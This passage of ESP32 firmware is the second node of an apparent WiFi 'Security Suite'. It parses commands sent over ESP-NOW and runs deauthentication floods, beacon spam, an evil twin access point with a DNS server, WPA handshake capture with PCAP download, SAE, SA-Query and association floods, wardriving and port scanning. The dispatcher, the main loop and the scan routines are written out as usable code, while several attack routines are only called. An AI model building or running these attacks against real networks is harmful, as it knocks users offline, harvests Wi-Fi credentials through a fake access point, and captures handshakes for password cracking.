void doPortScan(const char* ip, int startP, int endP) {
  char msg[100]; snprintf(msg,sizeof(msg),"[PortScan] Scanning %s:%d-%d ...",ip,startP,endP);
  sendToESP1(msg);
  int openCount = 0;
  for (int port = startP; port <= endP; port++) {
    WiFiClient client;
    client.setTimeout(300);
    if (client.connect(ip, port)) {
      client.stop();
      openCount++;
      snprintf(msg,sizeof(msg),"[PortScan] OPEN  %s:%d",ip,port);
      sendToESP1(msg);
      delay(10);
    }
  }
  snprintf(msg,sizeof(msg),"[PortScan] Done. %d open port(s) found.",openCount);
  sendToESP1(msg);
}

// ══════════════════════════════════════════════
//  WARDRIVING
// ══════════════════════════════════════════════
void doWardrive() {
  bool wasRunning = monitorRunning;
  if (wasRunning) { esp_wifi_set_promiscuous(false); }
  WiFi.mode(WIFI_STA);
  int found = WiFi.scanNetworks(false,true);
  char buf[120];
  snprintf(buf,sizeof(buf),"[Wardrive] Ch%d → found %d APs",wdScanCh,found);
  sendToESP1(buf);
  for (int i = 0; i < found && i < 10; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    snprintf(buf,sizeof(buf),"[WD] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
      WiFi.channel(i), WiFi.RSSI(i), WiFi.SSID(i).c_str());
    sendToESP1(buf);
    delay(15);
  }
  WiFi.scanDelete();
  wdScanCh = (wdScanCh % 13) + 1; // advance channel
  esp_wifi_set_channel(wdScanCh, WIFI_SECOND_CHAN_NONE);
  if (wasRunning) { esp_wifi_set_promiscuous(true); }
}

// ══════════════════════════════════════════════
//  COMMAND DISPATCHER
// ══════════════════════════════════════════════
void processCommand(char* cmd) {
  Serial.printf("[CMD] %s\n", cmd);
  // Trim trailing newline/space
  int l = strlen(cmd);
  while (l > 0 && (cmd[l-1]==' '||cmd[l-1]=='\n'||cmd[l-1]=='\r')) cmd[--l]=0;

  if (strcmp(cmd,"monitor start")==0)  { startMonitor(); }
  else if (strcmp(cmd,"monitor stop")==0)   { stopMonitor(); }
  else if (strncmp(cmd,"channel ",8)==0) {
    int ch = atoi(cmd+8);
    if (ch>=1&&ch<=13) { esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE); lastChan=ch;
      char b[40]; snprintf(b,sizeof(b),"[Node2] Channel set to %d",ch); sendToESP1(b); }
  }
  else if (strcmp(cmd,"scan")==0) {
    bool was=monitorRunning;
    if(was) stopMonitor();
    // Switch to STA for scanning (promiscuous already off)
    WiFi.mode(WIFI_STA);
    delay(100);
    sendToESP1("[Node2] Scanning...");
    int n = WiFi.scanNetworks(false, true); // blocking, show hidden
    // Send results BEFORE touching ESP-NOW
    for(int i=0; i<n; i++){
      uint8_t* b = WiFi.BSSID(i);
      char buf[120];
      snprintf(buf, sizeof(buf), "[Scan] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
        b[0],b[1],b[2],b[3],b[4],b[5], WiFi.channel(i), WiFi.RSSI(i), WiFi.SSID(i).c_str());
      sendToESP1(buf);
      delay(20);
    }
    char s[50];
    snprintf(s, sizeof(s), "[Node2] Scan done. Found %d APs.", n);
    sendToESP1(s);
    delay(50); // let last message transmit before reinit
    WiFi.scanDelete();
    // Reinit ESP-NOW (scan disrupts the STA interface)
    reinitEspNow();
    if(was) startMonitor();
  }
  // ── IMPORTANT: check specific "stop/get" BEFORE prefix strncmp to avoid shadowing ──
  else if (strcmp(cmd,"deauth stop")==0) {
    deauthRunning=false;
    if (!monitorRunning && !hsRunning && !saQueryRunning && !assocFloodRunning && !saeRunning) esp_wifi_set_promiscuous(false);
    sendToESP1("[Node2] Deauth stopped.");
  }
  else if (strncmp(cmd,"deauth ",7)==0) {
    // format: deauth <BSSID> <CH> [client]
    char* tok = strtok(cmd+7," ");
    if (tok && parseMac(tok, deauthAP)) {
      char* chStr = strtok(nullptr," ");
      if (chStr && atoi(chStr)>0) {
        deauthChan = (uint8_t)atoi(chStr);
        char* cli = strtok(nullptr," ");
        if (cli) parseMac(cli, deauthCli); else memset(deauthCli,0xFF,6);
      } else {
        if (chStr) parseMac(chStr, deauthCli); else memset(deauthCli,0xFF,6);
        deauthChan = lastChan;
      }
      esp_wifi_set_channel(deauthChan, WIFI_SECOND_CHAN_NONE);
      ensurePromiscuous(); // REQUIRED for esp_wifi_80211_tx to inject frames
      deauthRunning=true;
      char buf[90]; snprintf(buf,sizeof(buf),"[Node2] Deauth flood → %s ch%d",tok,(int)deauthChan);
      sendToESP1(buf);
    }
  }
  else if (strcmp(cmd,"beacon start")==0) { beaconRunning=true;  sendToESP1("[Node2] Beacon spam started."); }
  else if (strcmp(cmd,"beacon stop")==0)  { beaconRunning=false; sendToESP1("[Node2] Beacon spam stopped."); }
  else if (strcmp(cmd,"eviltwin stop")==0) { stopEvilTwin(); }
  else if (strncmp(cmd,"eviltwin ",9)==0) { startEvilTwin(cmd+9); }
  else if (strcmp(cmd,"handshake stop")==0) {
    hsRunning=false; stopMonitor(); sendToESP1("[Node2] Handshake capture stopped.");
    char b[60]; snprintf(b,sizeof(b),"[Node2] Captured %d EAPOL frames.",hsEapolCount); sendToESP1(b);
  }
  else if (strcmp(cmd,"handshake get")==0) { sendPcapDownload(); }
  else if (strncmp(cmd,"handshake ",10)==0) {
    // format: handshake <BSSID> <CH>
    char* bssidStr = strtok(cmd+10," ");
    char* chStr    = strtok(nullptr," ");
    if (bssidStr) {
      if (chStr && atoi(chStr)>0) { lastChan=(uint8_t)atoi(chStr); esp_wifi_set_channel(lastChan,WIFI_SECOND_CHAN_NONE); }
      startHandshake(bssidStr);
    }
  }
  else if (strcmp(cmd,"sae stop")==0) {
    saeRunning=false;
    if (!monitorRunning && !hsRunning && !deauthRunning && !saQueryRunning && !assocFloodRunning) esp_wifi_set_promiscuous(false);
    sendToESP1("[Node2] SAE flood stopped.");
  }
  else if (strncmp(cmd,"sae ",4)==0) {
    // format: sae <BSSID> <CH>
    char* bssidStr = strtok(cmd+4," ");
    char* chStr    = strtok(nullptr," ");
    if (bssidStr && parseMac(bssidStr, saeAP)) {
      saeChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
      esp_wifi_set_channel(saeChan, WIFI_SECOND_CHAN_NONE);
      ensurePromiscuous();
      saeRunning=true;
      char buf[70]; snprintf(buf,sizeof(buf),"[Node2] SAE flood → %s ch%d",bssidStr,(int)saeChan);
      sendToESP1(buf);
    }
  }
  else if (strcmp(cmd,"saquery stop")==0) {
    saQueryRunning=false;
    if (!monitorRunning && !hsRunning && !deauthRunning && !saeRunning && !assocFloodRunning) esp_wifi_set_promiscuous(false);
    sendToESP1("[Node2] SA-Query flood stopped.");
  }
  else if (strncmp(cmd,"saquery ",8)==0) {
    // format: saquery <BSSID> <CH>
    char* bssidStr = strtok(cmd+8," ");
    char* chStr    = strtok(nullptr," ");
    if (bssidStr && parseMac(bssidStr, saQueryAP)) {
      saQueryChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
      esp_wifi_set_channel(saQueryChan, WIFI_SECOND_CHAN_NONE);
      ensurePromiscuous();
      saQueryRunning=true;
      char buf[80]; snprintf(buf,sizeof(buf),"[Node2] SA-Query flood → %s ch%d",bssidStr,(int)saQueryChan);
      sendToESP1(buf);
    }
  }
  else if (strcmp(cmd,"assocflood stop")==0) {
    assocFloodRunning=false;
    if (!monitorRunning && !hsRunning && !deauthRunning && !saeRunning && !saQueryRunning) esp_wifi_set_promiscuous(false);
    sendToESP1("[Node2] Assoc flood stopped.");
  }
  else if (strncmp(cmd,"assocflood ",11)==0) {
    // format: assocflood <BSSID> <CH>
    char* bssidStr = strtok(cmd+11," ");
    char* chStr    = strtok(nullptr," ");
    if (bssidStr && parseMac(bssidStr, assocFloodAP)) {
      assocFloodChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
      esp_wifi_set_channel(assocFloodChan, WIFI_SECOND_CHAN_NONE);
      ensurePromiscuous();
      assocFloodRunning=true;
      char buf[80]; snprintf(buf,sizeof(buf),"[Node2] Assoc flood → %s ch%d",bssidStr,(int)assocFloodChan);
      sendToESP1(buf);
    }
  }
  else if (strcmp(cmd,"wardrive start")==0) { wardrive=true;  sendToESP1("[Node2] Wardriving started."); }
  else if (strcmp(cmd,"wardrive stop")==0)  { wardrive=false; sendToESP1("[Node2] Wardriving stopped."); }
  else if (strncmp(cmd,"portscan ",9)==0) {
    char ip[20]; int sp=1,ep=1024;
    sscanf(cmd+9,"%19s %d %d",ip,&sp,&ep);
    doPortScan(ip,sp,ep);
  }
  else if (strcmp(cmd,"status")==0) {
    char b[160];
    snprintf(b,sizeof(b),"[Node2] mon=%s dauth=%s bcn=%s evil=%s hs=%s sae=%s saq=%s afl=%s wd=%s ch=%d",
      monitorRunning?"ON":"OFF", deauthRunning?"ON":"OFF", beaconRunning?"ON":"OFF",
      evilTwinRunning?"ON":"OFF", hsRunning?"ON":"OFF", saeRunning?"ON":"OFF",
      saQueryRunning?"ON":"OFF", assocFloodRunning?"ON":"OFF", wardrive?"ON":"OFF", lastChan);
    sendToESP1(b);
  }
  else {
    char b[100]; snprintf(b,sizeof(b),"[Node2] Unknown: %s",cmd); sendToESP1(b);
  }
}

// ══════════════════════════════════════════════
//  ESP-NOW RECEIVE CALLBACK
// ══════════════════════════════════════════════
void OnDataRecv(const esp_now_recv_info_t* info, const uint8_t* data, int len) {
  if (len <= 0 || len >= CMD_LEN) return;
  // Only accept new command if previous one was consumed
  if (!hasPendingCmd) {
    memcpy(pendingCmd, data, len);
    pendingCmd[len] = '\0';
    hasPendingCmd = true;
  }
}

// ══════════════════════════════════════════════
//  SETUP
// ══════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n\n==== ESP32 Node 2 — Security Suite ====");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("╔══════════════════════════════════════════╗");
  Serial.printf ("║  My MAC: %-32s║\n", WiFi.macAddress().c_str());
  Serial.println("║  Paste above into esp1.ino ESP2_MAC[]    ║");
  Serial.println("╚══════════════════════════════════════════╝");

  if (esp_now_init()!=ESP_OK) { Serial.println("FATAL: ESP-NOW failed"); while(1)delay(1000); }
  esp_now_register_recv_cb(OnDataRecv);
  memset(&peerInfo,0,sizeof(peerInfo));
  memcpy(peerInfo.peer_addr,ESP1_MAC,6);
  peerInfo.channel=1; peerInfo.encrypt=false; peerInfo.ifidx=WIFI_IF_STA;
  if (esp_now_add_peer(&peerInfo)!=ESP_OK) Serial.println("ERROR: peer add failed");
  else Serial.println("ESP-NOW peer (Node 1) registered.");
  Serial.println("Node 2 ready.");
}

// ══════════════════════════════════════════════
//  LOOP
// ══════════════════════════════════════════════
void loop() {
  // Process command from ESP1 (clear flag BEFORE processing so new cmds can arrive)
  if (hasPendingCmd) {
    char local[CMD_LEN];
    memcpy(local, pendingCmd, CMD_LEN);
    hasPendingCmd = false;  // clear AFTER copy, BEFORE processing
    processCommand(local);
  }

  unsigned long now = millis();

  // Monitor stats
  if (monitorRunning && now-lastStatTime>=STAT_MS) {
    lastStatTime=now;
    uint32_t c=pktCount; pktCount=0;
    char b[80]; snprintf(b,sizeof(b),"[Monitor] pkts/s=%lu RSSI=%d ch=%d",
      (unsigned long)c*1000/STAT_MS,(int)lastRSSI,(int)lastChan);
    sendToESP1(b);
  }

  // Handshake EAPOL staging (ISR → loop)
  if (hsPktReady && hsRunning) {
    hsPktReady=false;
    appendPcapPkt(hsTmpPkt, hsTmpLen);
    hsEapolCount++;
    char b[60]; snprintf(b,sizeof(b),"[Handshake] EAPOL frame #%d captured!",hsEapolCount);
    sendToESP1(b);
    if (hsEapolCount>=4) {
      sendToESP1("[Handshake] 4-way handshake complete! Click 'Download PCAP'.");
    }
  }

  // Deauth flood
  if (deauthRunning && now-lastDeauthTime>=DEAUTH_MS) {
    lastDeauthTime=now;
    doDeauth();
  }

  // SA-Query flood (Management Frame Flooding)
  if (saQueryRunning && now-lastSaQueryTime>=SAQUERY_MS) {
    lastSaQueryTime=now;
    doSaQueryFlood();
  }

  // Assoc Response flood
  if (assocFloodRunning && now-lastAssocFloodTime>=ASSOCFLOOD_MS) {
    lastAssocFloodTime=now;
    doAssocFlood();
  }

  // SAE flood
  if (saeRunning && now-lastSaeTime>=SAE_MS) {
    lastSaeTime=now;
    doSaeFlood();
  }

  // Beacon spam
  if (beaconRunning && now-lastBeaconTime>=BEACON_MS) {
    lastBeaconTime=now;
    doBeacon();
  }

  // Evil Twin server/DNS
  if (evilTwinRunning) {
    if (evilServer) evilServer->handleClient();
    if (dnsServer)  dnsServer->processNextRequest();
  }

  // Wardriving
  if (wardrive && now-lastWdTime>=WD_INTERVAL) {
    lastWdTime=now;
    doWardrive();
    reinitEspNow();
  }

  delay(5);
}
